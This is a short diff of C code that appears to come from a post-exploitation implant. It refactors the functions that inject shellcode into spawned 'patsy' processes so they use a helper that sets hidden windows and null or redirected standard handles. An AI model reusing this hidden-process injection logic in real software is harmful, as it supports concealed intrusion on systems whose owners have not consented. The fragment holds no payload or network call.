@@ -70,13 +70,7 @@ void command_inject(char * buffer, int length, BOOL x86, BOOL ignoreToken) {
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
 
-	/* start a process */
-	GetStartupInfo(&si);
-	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-	si.wShowWindow = SW_HIDE;
-	si.hStdOutput = NULL;
-	si.hStdError = NULL;
-	si.hStdInput = NULL;
+		startupinfo_hidden(&si, NULL);
 
 	/* spawn our process */
 	if (!spawn_patsy(x86, ignoreToken, &si, &pi)) {
@@ -117,13 +111,7 @@ void command_spawnu(char * buffer, int length, BOOL x86) {
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
 
-	/* start a process */
-	GetStartupInfo(&si);
-	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-	si.wShowWindow = SW_HIDE;
-	si.hStdOutput = NULL;
-	si.hStdError = NULL;
-	si.hStdInput = NULL;
+		startupinfo_hidden(&si, NULL);
 
 	/* spawn our process */
 	if (!spawn_patsy_u(x86, TRUE, &si, &pi, ppid)) {
@@ -260,13 +248,7 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 		return;
 	}
 
-	/* further process our startup info data structure */
-	GetStartupInfo(&si);
-	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-	si.wShowWindow = SW_HIDE;
-	si.hStdOutput = newstdout;
-	si.hStdError = newstdout;
-	si.hStdInput = NULL;
+		startupinfo_hidden(&si, newstdout);
 
 	/* do our spawn logic, please! */
 	if (!spawn_patsy(x86, ignoreToken, &si, &pi)) {
